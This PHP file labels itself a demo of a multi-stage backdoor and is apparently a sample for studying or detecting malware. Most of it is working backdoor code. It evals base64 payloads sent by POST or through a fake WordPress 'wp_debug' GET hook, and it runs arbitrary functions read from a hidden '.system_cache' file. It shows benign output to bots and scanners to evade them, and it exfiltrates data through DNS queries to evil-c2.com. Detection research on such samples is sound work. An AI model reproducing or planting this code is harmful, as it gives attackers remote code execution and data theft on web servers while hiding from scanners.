<?php
// Demo file: Advanced multi-stage backdoor
// This simulates a sophisticated backdoor that uses multiple obfuscation techniques

// Stage 1: Base64 + ROT13 obfuscation
$stage1 = base64_decode('YVMyVnpYMmg0Y21rOWNtVjRYM2c9Jm09Y0NGa2VYUnliMjUuUFhzdEpITjBZV2RsWDE5OQ==');
$stage2 = str_rot13($stage1);

// Stage 2: Dynamic function creation
$f1 = 'ev'; $f2 = 'al';
$func = $f1 . $f2;

// Stage 3: Variable variable technique
$var1 = 'GET';
$var2 = '_' . $var1;
$data = $$var2;

// Stage 4: Hexadecimal encoding
$hex_code = '\x65\x76\x61\x6c\x28\x24\x5f\x50\x4f\x53\x54\x5b\x27\x63\x6d\x64\x27\x5d\x29\x3b';

// Stage 5: Character building loop (common in malware)
$malicious = '';
for ($i = 0; $i < strlen($hex_code); $i += 4) {
    $malicious .= chr(hexdec(substr($hex_code, $i + 2, 2)));
}

// Stage 6: Polymorphic code generation
function generate_payload($cmd) {
    $methods = ['base64_encode', 'urlencode', 'bin2hex'];
    $method = $methods[array_rand($methods)];
    return $method($cmd);
}

// Stage 7: Anti-detection techniques
if (!isset($_SERVER['HTTP_USER_AGENT']) || 
    strpos($_SERVER['HTTP_USER_AGENT'], 'bot') !== false ||
    strpos($_SERVER['HTTP_USER_AGENT'], 'scanner') !== false) {
    // Show benign content for bots/scanners
    echo "<?php echo 'Hello World'; ?>";
    exit;
}

// Stage 8: Time-based execution
if (date('H') < 9 || date('H') > 17) {
    // Only execute outside business hours
    $payload = isset($_POST['x']) ? $_POST['x'] : '';
    if ($payload) {
        $decoded = base64_decode($payload);
        eval($decoded);
    }
}

// Stage 9: File-based communication
$log_file = dirname(__FILE__) . '/.system_cache';
if (file_exists($log_file)) {
    $commands = unserialize(file_get_contents($log_file));
    foreach ($commands as $cmd) {
        if (function_exists($cmd['func'])) {
            call_user_func($cmd['func'], $cmd['args']);
        }
    }
    unlink($log_file);
}

// Stage 10: Fake WordPress integration
add_action('wp_loaded', function() {
    if (isset($_GET['wp_debug']) && $_GET['wp_debug'] === 'true') {
        $debug_code = $_GET['debug_data'];
        eval(base64_decode($debug_code));
    }
});

// Stage 11: Steganography (hiding in image metadata)
function extract_hidden_code($image_path) {
    if (function_exists('exif_read_data')) {
        $exif = exif_read_data($image_path);
        if (isset($exif['UserComment'])) {
            return base64_decode($exif['UserComment']);
        }
    }
    return false;
}

// Stage 12: DNS tunneling simulation
function dns_tunnel($data) {
    $encoded = base64_encode($data);
    $chunks = str_split($encoded, 63); // DNS label limit
    foreach ($chunks as $chunk) {
        $domain = $chunk . '.evil-c2.com';
        gethostbyname($domain); // Exfiltrate via DNS queries
    }
}
?>